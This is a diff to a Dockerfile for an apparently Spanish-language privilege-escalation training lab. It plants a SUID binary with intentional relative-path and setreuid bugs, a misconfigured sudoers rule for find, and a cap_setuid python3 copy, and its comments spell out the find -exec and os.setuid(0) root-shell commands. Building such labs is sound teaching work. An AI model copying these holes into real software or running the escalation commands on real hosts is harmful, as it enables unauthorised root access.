@@ -27,12 +27,7 @@ RUN useradd -m -s /bin/bash sysadmin && \
 RUN useradd -m -s /bin/bash devops && \
     echo "devops:$(openssl rand -hex 16)" | chpasswd
 
-# ============================================================
-# ETAPA 1: hacker -> sysadmin
-# Tecnica: SUID en binario custom que ejecuta un script
-#          propiedad de "sysadmin" sin ruta absoluta
-# ============================================================
-# Binario SUID owned by sysadmin que ejecuta un "health check"
+
 RUN printf '#include <stdio.h>\n\
 #include <stdlib.h>\n\
 #include <unistd.h>\n\
@@ -40,9 +35,19 @@ RUN printf '#include <stdio.h>\n\
 int main() {\n\
     printf("[*] Running network health check...\\n");\n\
     fflush(stdout);\n\
-    // Vulnerabilidad: usa ruta relativa + execvp mantiene SUID\n\
+    \n\
+    // BUG de seguridad: setreuid() fija el UID real al efectivo\n\
+    // Esto hace que el privilegio sea "sticky" y no se pierda\n\
+    // al ejecutar scripts con bash.\n\
+    uid_t euid = geteuid();\n\
+    setreuid(euid, euid);\n\
+    \n\
+    // BUG de seguridad: ruta relativa al CWD\n\
+    // Un atacante puede crear ./scripts/netcheck.sh en un\n\
+    // directorio que controle y ejecutar este binario desde ahi.\n\
     char *args[] = {"netcheck.sh", NULL};\n\
-    execvp("./scripts/netcheck.sh", args);\n\
+    char *envp[] = {NULL};\n\
+    execve("./scripts/netcheck.sh", args, envp);\n\
     perror("exec failed");\n\
     return 1;\n\
 }\n' > /tmp/healthcheck.c && \
@@ -78,6 +83,7 @@ echo "  1. Empieza buscando binarios SUID inusuales."\n\
 echo "  2. Presta atencion a QUIEN es el owner del SUID."\n\
 echo "  3. Cada usuario tiene sus propias debilidades."\n\
 echo "  4. No todo es SUID... mira sudoers, capabilities..."\n\
+echo "  5. A veces un programa busca archivos donde no deberia..."\n\
 echo ""\n\
 echo "Buena suerte."\n\
 echo ""\n' > /home/hacker/instrucciones.sh && \
@@ -88,12 +94,17 @@ echo ""\n' > /home/hacker/instrucciones.sh && \
 # ETAPA 2: sysadmin -> devops
 # Tecnica: sudoers mal configurado - sysadmin puede ejecutar
 #          /usr/bin/find como devops sin password
+# Explotacion:
+#   sudo -u devops /usr/bin/find /tmp -name "x" -exec /bin/bash \;
 # ============================================================
 RUN echo "sysadmin ALL=(devops) NOPASSWD: /usr/bin/find" >> /etc/sudoers
 
 # ============================================================
 # ETAPA 3: devops -> root
 # Tecnica: Capability cap_setuid en python3
+# Explotacion:
+#   /usr/local/bin/python3-tools -c \
+#     'import os; os.setuid(0); os.system("/bin/bash")'
 # ============================================================
 RUN cp /usr/bin/python3 /usr/local/bin/python3-tools && \
     chown devops:devops /usr/local/bin/python3-tools && \
